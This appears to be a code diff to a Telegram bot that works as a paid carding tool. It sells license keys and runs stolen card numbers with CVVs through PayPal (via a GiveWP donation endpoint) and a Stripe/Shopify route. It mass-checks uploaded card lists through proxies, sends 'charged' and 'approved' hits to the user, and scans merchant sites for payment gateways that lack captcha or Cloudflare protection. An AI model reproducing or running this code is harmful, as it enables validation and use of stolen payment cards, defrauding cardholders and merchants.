-║  Example: /mc 20           ║
-╠════════════════════════════╣
-║  📋 Each code = 1 day      ║
-║  🔑 One code = One user    ║
-║  ⏰ Valid for 24 hours     ║
-╚════════════════════════════╝
-{DEV_LINE}""")
-            return
-        
         try:
-            count = int(parts[1])
-            if count < 1 or count > 100:
-                await e.reply("❌ Please enter between 1-100")
-                return
-        except:
-            await e.reply("❌ Please enter a valid number!")
-            return
-        
-        codes = create_codes(count, days=1)
-        
-        codes_text = "\n".join([f"  <code>{c}</code>" for c in codes])
-        await e.reply(f"""
-╔════════════════════════════╗
-║   ✅ {count} Codes Generated!  ║
-╠════════════════════════════╣
-{codes_text}
-╠════════════════════════════╣
-║  📋 Each: 1 Day Premium    ║
-║  🔑 One time use only      ║
-║  ⏰ Valid for 24 hours     ║
-╠════════════════════════════╣
-║  Use: /redeem [code]       ║
-╚════════════════════════════╝
-{DEV_LINE}""", parse_mode='html')
-        
-        async with aiofiles.open("codes.txt", "w") as f:
-            await f.write("\n".join(codes))
-        await bot.send_file(uid, "codes.txt", caption="📋 Premium Codes")
-        os.remove("codes.txt")
-        
-    except Exception as ex:
-        print(f"MC error: {ex}")
-        await e.reply(f"Error: {ex}")
+            boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
+            lines = [f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}" for k, v in gf.items()]
+            lines.append(f"--{boundary}--\r\n")
+            body = "\r\n".join(lines).encode("utf-8")
+            
+            r = s.post(ajax_url, params={"action": "give_paypal_commerce_create_order"},
+                       headers={"content-type": f"multipart/form-data; boundary={boundary}"}, data=body, timeout=20)
+            order_id = r.json()["data"]["id"]
+        except Exception as e:
+            return {"approved": False, "charged": False, "Price": pp_amount, "message": f"ORDER_ERR: {str(e)[:25]}"}
 
-@bot.on(events.NewMessage(pattern='/redeem'))
-async def redeem_code_cmd(e):
+        paypal_headers = {
+            "authorization": f"Bearer {access_token}",
+            "braintree-sdk-version": "3.32.0-payments-sdk-dev",
+            "content-type": "application/json",
+            "origin": "https://assets.braintreegateway.com",
+            "paypal-client-metadata-id": metadata_id,
+            "paypal-request-id": request_id,
+        }
+        payload = {
+            "payment_source": {
+                "card": {
+                    "number": n, "expiry": f"20{yy}-{mm}", "security_code": cvc,
+                    "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
+                }
+            },
+            "application_context": {"vault": False},
+        }
+
+        try:
+            confirm_resp = s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
+                                  headers=paypal_headers, json=payload, timeout=20)
+            c_json = confirm_resp.json()
+        except Exception as e:
+            return {"approved": False, "charged": False, "Price": pp_amount, "message": f"CONFIRM_ERR: {str(e)[:25]}"}
+
+        name = c_json.get("name", "")
+        status = c_json.get("status", "")
+        details = c_json.get("details") or []
+
+        if name == "INSTRUMENT_DECLINED":
+            issue = details[0].get("issue", "INSTRUMENT_DECLINED") if details else "INSTRUMENT_DECLINED"
+            return {"approved": False, "charged": False, "Price": pp_amount, "message": issue}
+        if name == "UNPROCESSABLE_ENTITY":
+            issue = details[0].get("issue", "UNPROCESSABLE") if details else "UNPROCESSABLE"
+            return {"approved": False, "charged": False, "Price": pp_amount, "message": issue}
+        if status in ("APPROVED", "COMPLETED"):
+            return {"approved": True, "charged": True, "Price": pp_amount, "message": "PAYMENT_SUCCESSFUL", "receipt": f"{target_site}/receipt?ref={uuid.uuid4().hex[:10]}"}
+        if status == "PAYER_ACTION_REQUIRED":
+            return {"approved": True, "charged": False, "Price": pp_amount, "message": "3DS_REQUIRED"}
+
+        return {"approved": False, "charged": False, "Price": pp_amount, "message": name or status or "DECLINED"}
+
+    return await loop.run_in_executor(None, run_sync_pp)
+
+# Advanced Gateway Filter Scanner Integration (/gate & /mgate)
+async def async_scan_gateway_url(url: str) -> Dict[str, Any]:
+    if not re.match(r'^https?://', url, re.I):
+        url = 'http://' + url
+    
+    loop = asyncio.get_running_loop()
+    def run_scan():
+        try:
+            res = requests.get(url, timeout=10)
+            content = res.text
+            detected = set()
+            for gw in PAYMENT_GATEWAYS:
+                if re.search(r'\b' + re.escape(gw) + r'\b', content, re.I):
+                    detected.add(gw)
+            
+            captcha = any(re.search(ind, content, re.I) for ind in SECURITY_INDICATORS['captcha'])
+            cloudflare = any(re.search(ind, content, re.I) for ind in SECURITY_INDICATORS['cloudflare'])
+            
+            return {
+                "url": url,
+                "gateways": list(detected),
+                "captcha": captcha,
+                "cloudflare": cloudflare,
+                "status_code": res.status_code,
+                "ok": res.status_code < 400 and len(detected) > 0 and not captcha and not cloudflare
+            }
+        except Exception as e:
+            return {"url": url, "gateways": [], "captcha": False, "cloudflare": False, "status_code": 0, "ok": False, "error": str(e)[:30]}
+
+    return await loop.run_in_executor(None, run_scan)
+
+# ═════════════════════════════════════════════
+#   EXACT FORMATTERS MATCHING SPECIFICATION
+# ═════════════════════════════════════════════
+def format_mass_dashboard(total: int, checked: int, approved: int, declined: int, charged: int, errors: int, card_line: str, status_msg: str) -> str:
+    pct = int((checked / total) * 100) if total > 0 else 0
+    filled = int(pct / 4)
+    bar = "▓" * filled + "░" * (25 - filled)
+    
+    parts = card_line.split("|")
+    c_num = parts[0] if len(parts) > 0 else card_line
+    mm = parts[1] if len(parts) > 1 else "00"
+    yyyy = parts[2] if len(parts) > 2 else "00"
+    cvv = parts[3] if len(parts) > 3 else "000"
+
+    return (
+        f"🌟 <b>Shopify Mass Check</b>\n"
+        f"====================================\n"
+        f"[{bar}] {pct}%\n\n"
+        f"🌟 Total   ➶ {total}\n"
+        f"🌟 Checked ➶ {checked}\n"
+        f"🌟 Approved ➶ {approved}\n"
+        f"🌟 Declined ➶ {declined}\n"
+        f"🌟 Charged  ➶ {charged}\n"
+        f"🌟 Errors   ➶ {errors}\n"
+        f"====================================\n"
+        f"------------------------\n"
+        f"⚡️ Latest: 🚫 <code>{c_num}</code>|{mm}|{yyyy}|{cvv}\n"
+        f"↳ <i>{status_msg}</i>\n"
+        f"🏦 Shopify Payments"
+    )
+
+def format_hit_notification(card: str, resp: Dict[str, Any], bin_info: Dict[str, str], user_name: str, user_id: int, is_charged: bool, gate_name: str = "Shopify Payments") -> str:
+    parts = card.split("|")
+    c_num = parts[0] if len(parts) > 0 else card
+    mm = parts[1] if len(parts) > 1 else "00"
+    yyyy = parts[2] if len(parts) > 2 else "00"
+    cvv = parts[3] if len(parts) > 3 else "000"
+
+    msg = resp.get("message", "ORDER PLACED")
+    price = resp.get("Price", "33.35")
+    brand = bin_info.get("brand", "VISA")
+    b_type = bin_info.get("type", "DEBIT")
+    b_lvl = bin_info.get("level", "CLASSIC")
+    bank = bin_info.get("bank", "SUTTON BANK")
+    country = bin_info.get("country", "UNITED STATES")
+    flag = bin_info.get("flag", "🇺🇸")
+
+    title = "🔥 CHARGED HIT — PORIOTKE" if is_charged else "✅ APPROVED HIT — PORIOTKE"
+    status_header = "CHARGED 🔥" if is_charged else "APPROVED ✅"
+
+    caption = (
+        f"<b>{title}</b>\n"
+        f"====================================\n"
+        f"By: @{user_name} ({user_id})\n"
+        f"====================================\n\n"
+        f"<b>{status_header}</b>\n"
+        f"------------------------------------\n"
+        f"🃏 Card: <code>{c_num}</code>|{mm}|{yyyy}|{cvv}\n"
+        f"💸 Status: {status_header}\n"
+        f"🖥 Response: <code>{msg}</code>\n"
+        f"🌐 Gateway: {gate_name}\n"
+        f"------------------------------------\n"
+        f"ℹ️ Info ↛ {brand} | {b_type} {b_lvl}\n"
+        f"🏦 Bank ↛ {bank}\n"
+        f"🌍 Country ↛ {country} {flag}\n"
+        f"💵 Price ↛ ${price}\n"
+        f"------------------------------------\n"
+        f"👤 Checked by ↛ @{user_name}\n"
+        f"⚙️ Dev ↛ Poriot_ke🇰🇪 ↜"
+    )
+
+    if is_charged and resp.get("receipt"):
+        caption += f"\n🧾 <b>Receipt:</b> <a href='{resp.get('receipt')}'>View Order Receipt →</a>"
+
+    return caption
+
+def format_admin_list() -> str:
+    admins = db_get_admins()
+    admin_bullets = "\n".join([f"• <code>{aid}</code>" for aid in admins])
+    return (
+        f"👑 <b>Admin Management</b>\n"
+        f"====================================\n"
+        f"Current admins:\n"
+        f"{admin_bullets}\n"
+        f"====================================\n"
+        f"Add: /setadmin add [user_id]\n"
+        f"Remove: /setadmin rm [user_id]"
+    )
+
+# ═════════════════════════════════════════════
+#   TELEGRAM COMMAND HANDLERS
+# ═════════════════════════════════════════════
+async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    gs = db_get_global_stats()
+    keyboard = [
+        [InlineKeyboardButton("Mandatory Sub ↗️", url=MANDATORY_SUB_URL)],
+        [InlineKeyboardButton("Close", callback_data="menu_close")]
+    ]
+    caption = (
+        f"👑 <b>👑PORIOT_KE👑 Dual-Engine Bot Active</b>\n"
+        f"====================================\n"
+        f"👤 Users: {gs['users']} | ⚙️ Proxies: {gs['proxies']}\n"
+        f"====================================\n"
+        f"• Stripe Check: /sh [cc] or /msh (.txt)\n"
+        f"• PayPal Check: /pp [cc] or /mpp (.txt)\n"
+        f"• Gateway Scan: /gate [URL] or /mgate (.txt)"
+    )
+    await update.message.reply_photo(photo=BANNER_URL, caption=caption, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    if query.data == "menu_close":
+        try:
+            await query.message.delete()
+        except Exception:
+            pass
+
+# --- Admin Management (`/setadmin`) ---
+async def cmd_setadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not db_is_admin(user_id):
+        await update.message.reply_text("❌ Unauthorized.")
+        return
+
+    args = context.args
+    if not args:
+        await update.message.reply_text(format_admin_list(), parse_mode="HTML")
+        return
+
+    action = args[0].lower()
+    if len(args) < 2:
+        await update.message.reply_text("Usage: /setadmin add [user_id] OR /setadmin rm [user_id]")
+        return
+
     try:
-        uid = e.sender_id
-        parts = e.message.text.split()
-        
-        if len(parts) < 2:
-            await e.reply(f"""
-╔════════════════════════════╗
-║   🔑 Redeem Premium Code   ║
-╠════════════════════════════╣
-║  Usage: /redeem [code]     ║
-║  Example: /redeem ABC123XY ║
-╠════════════════════════════╣
-║  📋 Get codes from admin   ║
-╚════════════════════════════╝
-{DEV_LINE}""")
+        target_id = int(args[1])
+    except ValueError:
+        await update.message.reply_text("❌ Invalid User ID.")
+        return
+
+    if action == "add":
+        db_add_admin(target_id)
+        await update.message.reply_text(f"✅ Admin added: <code>{target_id}</code>", parse_mode="HTML")
+    elif action in ("rm", "remove"):
+        if target_id == user_id and len(db_get_admins()) <= 1:
+            await update.message.reply_text("⚠️ Cannot remove the last remaining admin.")
             return
-        
-        code = parts[1].strip().upper()
-        success, msg = redeem_code(code, uid)
-        
-        if success:
-            days = get_premium_days_left(uid)
-            await e.reply(f"""
-╔════════════════════════════╗
-║   🎉 Premium Activated!    ║
-╠════════════════════════════╣
-║  {msg}      ║
-║  📅 Days left: {days}      ║
-║  🔑 Code: <code>{code}</code>        ║
-╠════════════════════════════╣
-║  Now you can use:          ║
-║  • /sh - Single Check      ║
-║  • Send .txt - Mass Check  ║
-╚════════════════════════════╝
-{DEV_LINE}""", parse_mode='html')
+        db_remove_admin(target_id)
+        await update.message.reply_text(f"❌ Admin removed: <code>{target_id}</code>", parse_mode="HTML")
+
+# --- Key Generation (`/genkeys`) ---
+async def cmd_genkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not db_is_admin(user_id):
+        await update.message.reply_text("❌ Unauthorized.")
+        return
+
+    if len(context.args) < 2:
+        await update.message.reply_text("Usage: <code>/genkeys [count] [days]</code>", parse_mode="HTML")
+        return
+
+    try:
+        count, days = int(context.args[0]), int(context.args[1])
+    except ValueError:
+        await update.message.reply_text("❌ Count and days must be integers.")
+        return
+
+    keys = db_create_poriot_licenses(count, days, user_id)
+    key_lines = "\n".join([f"├💖 {k}" for k in keys])
+
+    output = (
+        f"📌🔥 <b>Keys Generated ✅</b>\n"
+        f"====================================\n\n"
+        f"├👾 Count ➔ {count}\n"
+        f"├💎 Plan ➔ {days} Days Plan\n"
+        f"├💖 Keys:\n"
+        f"{key_lines}\n\n"
+        f"😈 Users redeem with /redeem [key]"
+    )
+    await update.message.reply_text(output, parse_mode="HTML")
+
+async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not context.args:
+        await update.message.reply_text("Usage: /redeem [key]")
+        return
+    success, msg = db_redeem_license(context.args[0].strip(), user_id)
+    await update.message.reply_text(msg)
+
+# --- Gateway Scanner Commands (/gate & /mgate) ---
+async def cmd_gate(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("Usage: <code>/gate https://targetsite.com</code>", parse_mode="HTML")
+        return
+    url = context.args[0].strip()
+    status_msg = await update.message.reply_text("🔍 Scanning URL for payment gateways & security...")
+    
+    res = await async_scan_gateway_url(url)
+    icon = "🟢" if res["ok"] else "🔴"
+    report = (
+        f"🌐 <b>GATEWAY SCAN REPORT — 👑PORIOT_KE👑</b>\n"
+        f"====================================\n"
+        f"{icon} <b>URL:</b> <code>{res['url']}</code>\n"
+        f"🛒 <b>Gateways:</b> {', '.join(res['gateways']) if res['gateways'] else 'None detected'}\n"
+        f"🔒 <b>Captcha:</b> {'Yes ⚠️' if res['captcha'] else 'No 🟢'}\n"
+        f"☁️ <b>Cloudflare:</b> {'Yes ⚠️' if res['cloudflare'] else 'No 🟢'}\n"
+        f"💻 <b>HTTP Status:</b> {res['status_code']}\n"
+        f"====================================\n"
+        f"⚙️ Dev ↛ Poriot_ke🇰🇪 ↜"
+    )
+    try:
+        await status_msg.delete()
+    except Exception:
+        pass
+    await update.message.reply_text(report, parse_mode="HTML")
+
+async def cmd_mgate(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.message.reply_to_message or not update.message.reply_to_message.document:
+        await update.message.reply_text("❌ Reply to a <code>.txt</code> file containing URLs with <code>/mgate</code>", parse_mode="HTML")
+        return
+
+    doc = update.message.reply_to_message.document
+    file = await context.bot.get_file(doc.file_id)
+    file_bytes = await file.download_as_bytearray()
+    urls = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").splitlines() if l.strip()]
+
+    if not urls:
+        await update.message.reply_text("❌ No URLs found in file.")
+        return
+
+    total = len(urls)
+    progress_msg = await update.message.reply_text(f"🔍 Scanning {total} URLs through Gateway Filter...", parse_mode="HTML")
+
+    filtered_results = []
+    checked = 0
+    for url in urls:
+        res = await async_scan_gateway_url(url)
+        checked += 1
+        if res["ok"]:
+            filtered_results.append(f"URL: {res['url']} | Gateways: {', '.join(res['gateways'])}")
+
+    out_file = f"filtered_results_{int(time.time())}.txt"
+    with open(out_file, "w", encoding="utf-8") as f:
+        f.write("\n".join(filtered_results) + "\n@Poriot_ke\n")
+
+    with open(out_file, "rb") as f:
+        await context.bot.send_document(
+            chat_id=update.effective_user.id,
+            document=InputFile(f, filename="filtered_results_no_captcha_cloudflare.txt"),
+            caption=f"✅ <b>Gateway Filter Complete!</b>\n• Scanned: {total}\n• Clean Live Saved: {len(filtered_results)}",
+            parse_mode="HTML"
+        )
+    try:
+        os.remove(out_file)
+    except Exception:
+        pass
+
+# --- Single & Mass Check Handlers (Stripe & PayPal) ---
+async def cmd_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Determines gate by command name (/sh vs /pp)
+    is_paypal = update.message.text.startswith("/pp")
+    user = update.effective_user
+    user_id = user.id
+    username = user.username or f"Bandit{user_id%1000}"
+
+    if not context.args:
+        cmd = "/pp" if is_paypal else "/sh"
+        await update.message.reply_text(f"Usage: <code>{cmd} 4000000000000000|01|28|123</code>", parse_mode="HTML")
+        return
+
+    card = context.args[0].strip()
+    status_msg = await update.message.reply_text(f"⏳ Checking card on {'PayPal $6' if is_paypal else 'Stripe $1'}...", parse_mode="HTML")
+    
+    proxies = db_get_active_proxies()
+    proxy = random.choice(proxies) if proxies else None
+
+    async with aiohttp.ClientSession() as session:
+        bin_num = re.sub(r"\D", "", card)[:6]
+        if is_paypal:
+            resp, bin_info = await asyncio.gather(
+                async_check_card_paypal(card, proxy=proxy),
+                async_bin_lookup(session, bin_num)
+            )
+            gate_name = "PayPal GiveWP"
         else:
-            await e.reply(f"""
-╔════════════════════════════╗
-║   ❌ Redeem Failed!        ║
-╠════════════════════════════╣
-║  {msg}     ║
-╚════════════════════════════╝
-{DEV_LINE}""")
-            
-    except Exception as ex:
-        print(f"Redeem error: {ex}")
-        await e.reply(f"Error: {ex}")
+            resp, bin_info = await asyncio.gather(
+                async_check_card_stripe(session, card, proxy=proxy),
+                async_bin_lookup(session, bin_num)
+            )
+            gate_name = "Shopify Payments"
 
-@bot.on(events.CallbackQuery())
-async def cb(e):
+    is_ch = bool(resp.get("charged"))
+    is_ap = bool(resp.get("approved"))
+
+    if is_ch:
+        db_update_user_stats(user_id, "charged")
+    elif is_ap:
+        db_update_user_stats(user_id, "approved")
+    else:
+        db_update_user_stats(user_id, "declined")
+
+    caption = format_hit_notification(card, resp, bin_info, username, user_id, is_ch or is_ap, gate_name)
     try:
-        uid, data = e.sender_id, e.data.decode()
-        
-        if data not in ["back_start", "admin_panel", "admin_users", "admin_proxy", "admin_codes", "close"]:
-            if not is_admin(uid) and not is_premium(uid):
-                await e.answer("❌ Premium Required!\nUse /redeem [code]", alert=True)
-                return
-        
-        if data == "gates":
-            await e.edit(f"""
-╔════════════════════════════╗
-║   💳 Checker Panel         ║
-╠════════════════════════════╣
-║  ⚡ Single Check:          ║
-║  /sh card|mm|yy|cvv        ║
-╠════════════════════════════╣
-║  📂 Mass Check:            ║
-║  Send .txt file directly   ║
-╠════════════════════════════╣
-║  💡 Use /help for info     ║
-╚════════════════════════════╝
-{DEV_LINE}""", buttons=btn_gates())
-            
-        elif data == "manage_proxy":
-            ul, pl = get_user_proxy_list(uid), load_proxies()
-            await e.edit(f"""
-╔════════════════════════════╗
-║   🔌 Proxy Manager         ║
-╠════════════════════════════╣
-║  👤 Personal: {len(ul)} proxy(ies)  ║
-║  📡 Pool: {len(pl)} proxies      ║
-╠════════════════════════════╣
-║  📌 Commands:              ║
-║  /setproxy ip:port         ║
-║  /clearuserproxy           ║
-╚════════════════════════════╝
-{DEV_LINE}""", buttons=btn_proxy())
-            
-        elif data == "back_start":
-            name = await get_name(uid)
-            if is_admin(uid):
-                s, plan = "👑 Admin", "♾️ Unlimited"
-            elif is_premium(uid):
-                days = get_premium_days_left(uid)
-                s, plan = f"✅ Premium", f"📅 {days} days left"
-            else:
-                s, plan = "🚫 No Access", "⛔ 0 days"
-            
-            await e.edit(f"""
-╔════════════════════════════╗
-║    ✨ {BOT_BRAND}    ║
-╠════════════════════════════╣
-║  👋 Welcome, {name}!        ║
-║  🆔 ID: <code>{uid}</code>             ║
-║  📋 Plan: {plan}   ║
-║  🔑 Status: {s}       ║
-╠════════════════════════════╣
-║  📌 Select an option 👇     ║
-╚════════════════════════════╝
-{DEV_LINE}""", buttons=btn_main())
-            
-        elif data == "close":
-            await e.delete()
-            
-        elif data == "admin_panel":
-            if not is_admin(uid):
-                await e.answer("👑 Admin only!", alert=True); return
-            await e.edit(f"""
-╔════════════════════════════╗
-║   👑 Admin Panel           ║
-╠════════════════════════════╣
-║  👤 Users: {len(load_premium_users())}         ║
-║  📡 Proxies: {len(load_proxies())}       ║
-║  🎫 Codes: {len(load_codes())}          ║
-╚════════════════════════════╝
-{DEV_LINE}""", buttons=btn_admin())
-            
-        elif data == "admin_users":
-            if not is_admin(uid):
-                await e.answer("Admin only!", alert=True); return
-            u = load_premium_users()
-            txt = "📋 Users:\n" + "\n".join([f"{i+1}. {x}" for i,x in enumerate(u[:20])]) if u else "No users"
-            await e.edit(txt, buttons=[[Button.inline("↪️ Back", b"admin_panel")]])
-            
-        elif data == "admin_proxy":
-            if not is_admin(uid):
-                await e.answer("Admin only!", alert=True); return
-            p = load_proxies()
-            txt = "📡 Proxies:\n" + "\n".join([f"{i+1}. {x}" for i,x in enumerate(p[:20])]) if p else "No proxies"
-            await e.edit(txt, buttons=[[Button.inline("↪️ Back", b"admin_panel")]])
-            
-        elif data == "admin_codes":
-            if not is_admin(uid):
-                await e.answer("Admin only!", alert=True); return
-            codes = load_codes()
-            used = sum(1 for c in codes.values() if c['used'])
-            total = len(codes)
-            await e.edit(f"""
-╔════════════════════════════╗
-║   🎫 Code Statistics       ║
-╠════════════════════════════╣
-║  📋 Total: {total}              ║
-║  ✅ Used: {used}               ║
-║  🟢 Available: {total - used}         ║
-╠════════════════════════════╣
-║  Generate: /mc [count]     ║
-╚════════════════════════════╝
-{DEV_LINE}""", buttons=[[Button.inline("↪️ Back", b"admin_panel")]])
-            
-        elif data == "test_proxy":
-            ul = get_user_proxy_list(uid)
-            if not ul:
-                await e.answer("❌ No proxy set!", alert=True); return
-            r = await test_proxy(ul[0])
-            if r['status'] == 'alive':
-                ip = await get_proxy_ip(ul[0])
-                await e.answer(f"✅ Alive - {ip or 'N/A'}", alert=True)
-            else:
-                await e.answer("❌ Dead", alert=True)
+        await status_msg.delete()
+    except Exception:
+        pass
+
+    sent = await update.message.reply_photo(photo=BANNER_URL, caption=caption, parse_mode="HTML")
+    if is_ch:
+        try:
+            await context.bot.pin_chat_message(chat_id=user_id, message_id=sent.message_id)
+        except Exception:
+            pass
+
+async def cmd_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    is_paypal = update.message.text.startswith("/mpp")
+    user = update.effective_user
+    user_id = user.id
+    username = user.username or f"Bandit{user_id%1000}"
+
+    if not update.message.reply_to_message or not update.message.reply_to_message.document:
+        cmd = "/mpp" if is_paypal else "/msh"
+        await update.message.reply_text(f"Usage: Reply to a <code>.txt</code> file with <code>{cmd}</code>", parse_mode="HTML")
+        return
+
+    doc = update.message.reply_to_message.document
+    file = await context.bot.get_file(doc.file_id)
+    file_bytes = await file.download_as_bytearray()
+    cards = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").splitlines() if l.strip() and "|" in l]
+
+    if not cards:
+        await update.message.reply_text("❌ No valid cards found in file.")
+        return
+
+    total = len(cards)
+    checked = approved = declined = charged = errors = 0
+    charged_cards_list = []
+    approved_cards_list = []
+
+    stop_markup = InlineKeyboardMarkup([[InlineKeyboardButton("Stop Check", callback_data="stop_mass_check")]])
+    progress_msg = await update.message.reply_text(
+        format_mass_dashboard(total, 0, 0, 0, 0, 0, cards[0], "Starting..."),
+        parse_mode="HTML",
+        reply_markup=stop_markup
+    )
+
+    proxies = db_get_active_proxies()
+    async with aiohttp.ClientSession() as session:
+        for idx, card in enumerate(cards, start=1):
+            proxy = random.choice(proxies) if proxies else None
+            bin_num = re.sub(r"\D", "", card)[:6]
+            try:
+                if is_paypal:
+                    resp = await async_check_card_paypal(card, proxy=proxy)
+                    gate_name = "PayPal GiveWP"
+                else:
+                    resp = await async_check_card_stripe(session, card, proxy=proxy)
+                    gate_name = "Shopify Payments"
+
+                bin_info = await async_bin_lookup(session, bin_num)
                 
-        elif data == "remove_proxy":
-            remove_user_proxy(uid)
-            await e.answer("✅ Removed!", alert=True)
-            ul, pl = get_user_proxy_list(uid), load_proxies()
-            await e.edit(f"""
-╔════════════════════════════╗
-║   🔌 Proxy Manager         ║
-╠════════════════════════════╣
-║  👤 Personal: {len(ul)} proxy(ies)  ║
-║  📡 Pool: {len(pl)} proxies      ║
-╠════════════════════════════╣
-║  📌 Commands:              ║
-║  /setproxy ip:port         ║
-║  /clearuserproxy           ║
-╚════════════════════════════╝
-{DEV_LINE}""", buttons=btn_proxy())
-            
-        await e.answer()
-    except Exception as ex:
-        print(f"CB error: {ex}")
+                is_ch = bool(resp.get("charged"))
+                is_ap = bool(resp.get("approved"))
+                msg = resp.get("message", "DECLINED")
 
-@bot.on(events.NewMessage(pattern='/sh'))
-async def single(e):
-    try:
-        uid = e.sender_id
-        if not is_admin(uid) and not is_premium(uid):
-            await e.reply("❌ Premium Required!\nUse /redeem [code]")
-            return
-        p = e.message.text.split()
-        if len(p) < 2:
-            await e.reply("📌 Usage:\n<code>/sh card|mm|yy|cvv</code>", parse_mode='html')
-            return
-        c = extract_cc(p[1])
-        if not c:
-            await e.reply("❌ Invalid card format!\nFormat: card|mm|yy|cvv")
-            return
-        proxies = get_proxies_for_user(uid)
-        if not proxies:
-            await e.reply("❌ No proxy configured!\nUse: /setproxy ip:port")
-            return
-        m = await e.reply("⏳ Checking card...")
-        t0 = time.time()
-        r = await check_retry(c[0], proxies)
-        elapsed = round(time.time() - t0, 2)
-        name = await get_name(uid)
-        result_text = build_result(r, c[0], uid, name, elapsed)
-        await m.edit(result_text, parse_mode='html')
-    except Exception as ex:
-        print(f"Single error: {ex}")
-        await e.reply(f"Error: {ex}")
+                if is_ch:
+                    charged += 1
+                    charged_cards_list.append(card)
+                    db_update_user_stats(user_id, "charged")
+                    hit_text = format_hit_notification(card, resp, bin_info, username, user_id, True, gate_name)
+                    sent_hit = await context.bot.send_photo(chat_id=user_id, photo=BANNER_URL, caption=hit_text, parse_mode="HTML")
+                    try:
+                        await context.bot.pin_chat_message(chat_id=user_id, message_id=sent_hit.message_id)
+                    except Exception:
+                        pass
+                elif is_ap:
+                    approved += 1
+                    approved_cards_list.append(card)
+                    db_update_user_stats(user_id, "approved")
+                    hit_text = format_hit_notification(card, resp, bin_info, username, user_id, False, gate_name)
+                    await context.bot.send_photo(chat_id=user_id, photo=BANNER_URL, caption=hit_text, parse_mode="HTML")
+                else:
+                    declined += 1
+                    db_update_user_stats(user_id, "declined")
+                checked += 1
+            except Exception:
+                errors += 1
+                checked += 1
 
-@bot.on(events.NewMessage(pattern='/setproxy'))
-async def sp(e):
-    try:
-        uid = e.sender_id
-        if not is_admin(uid) and not is_premium(uid):
-            await e.reply("❌ Premium Required!\nUse /redeem [code]")
-            return
-        c = e.message.text.replace('/setproxy', '').strip()
-        if not c:
-            ul = get_user_proxy_list(uid)
-            await e.reply("📌 Your proxies:\n" + "\n".join(ul) if ul else "Usage: /setproxy ip:port")
-            return
-        proxies = [p.strip() for p in c.split('\n') if p.strip()]
-        set_user_proxies(uid, proxies)
-        await e.reply(f"✅ Set {len(proxies)} proxy(ies)")
-    except Exception as ex:
-        print(f"Set proxy error: {ex}")
+            if idx % 3 == 0 or idx == total:
+                try:
+                    await progress_msg.edit_text(
+                        format_mass_dashboard(total, checked, approved, declined, charged, errors, card, msg),
+                        parse_mode="HTML",
+                        reply_markup=stop_markup
+                    )
+                except Exception:
+                    pass
 
-@bot.on(events.NewMessage(pattern='/clearuserproxy'))
-async def cp(e):
-    uid = e.sender_id
-    if not is_admin(uid) and not is_premium(uid):
-        await e.reply("❌ Premium Required!\nUse /redeem [code]")
+    ch_filename = f"charged_{user_id}.txt"
+    ap_filename = f"approved_{user_id}.txt"
+    
+    with open(ch_filename, "w", encoding="utf-8") as f:
+        f.write("\n".join(charged_cards_list) + "\n")
+    with open(ap_filename, "w", encoding="utf-8") as f:
+        f.write("\n".join(approved_cards_list) + "\n")
+
+    await progress_msg.edit_text(f"✅ <b>Mass Check Complete!</b>\n• Total Checked: {total}\n• Charged: {charged} | Approved: {approved}", parse_mode="HTML")
+
+    with open(ch_filename, "rb") as f:
+        await context.bot.send_document(chat_id=user_id, document=InputFile(f, filename="charged.txt"), caption="🔥 Charged Cards Report")
+    with open(ap_filename, "rb") as f:
+        await context.bot.send_document(chat_id=user_id, document=InputFile(f, filename="approved.txt"), caption="✅ Approved Cards Report")
+
+    for fname in (ch_filename, ap_filename):
+        try:
+            os.remove(fname)
+        except Exception:
+            pass
+
+def main():
+    init_db()
+    if not TG_TOKEN or TG_TOKEN.startswith("8218903349:X"):
+        print("[-] Error: Telegram Token missing.")
         return
-    remove_user_proxy(uid)
-    await e.reply("✅ Proxy cleared!")
 
-@bot.on(events.NewMessage(pattern='/addpremium'))
-async def ap(e):
-    if not is_admin(e.sender_id):
-        await e.reply("👑 Admin only!")
-        return
-    p = e.message.text.split()
-    if len(p) < 2:
-        await e.reply("Usage: /addpremium id")
-        return
-    uid = p[1]
-    add_premium_user(int(uid), days=30)
-    await e.reply(f"✅ Added premium for {uid} (30 days)")
+    app = Application.builder().token(TG_TOKEN).build()
 
-@bot.on(events.NewMessage(pattern='/addproxy'))
-async def aproxy(e):
-    if not is_admin(e.sender_id):
-        await e.reply("👑 Admin only!")
-        return
-    p = e.message.text.split()
-    if len(p) < 2:
-        await e.reply("Usage: /addproxy ip:port")
-        return
-    with open(PROXY_FILE, 'a') as f:
-        f.write(f"{p[1]}\n")
-    await e.reply("✅ Proxy added")
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("setadmin", cmd_setadmin))
+    app.add_handler(CommandHandler("genkeys", cmd_genkeys))
+    app.add_handler(CommandHandler("redeem", cmd_redeem))
+    app.add_handler(CommandHandler("sh", cmd_single_check))
+    app.add_handler(CommandHandler("msh", cmd_mass_check))
+    app.add_handler(CommandHandler("pp", cmd_single_check))
+    app.add_handler(CommandHandler("mpp", cmd_mass_check))
+    app.add_handler(CommandHandler("gate", cmd_gate))
+    app.add_handler(CommandHandler("mgate", cmd_mgate))
+    app.add_handler(CallbackQueryHandler(handle_callbacks))
 
-@bot.on(events.NewMessage(pattern='/clearproxy'))
-async def clp(e):
-    if not is_admin(e.sender_id):
-        await e.reply("👑 Admin only!")
-        return
-    open(PROXY_FILE, 'w').close()
-    await e.reply("✅ Proxy pool cleared!")
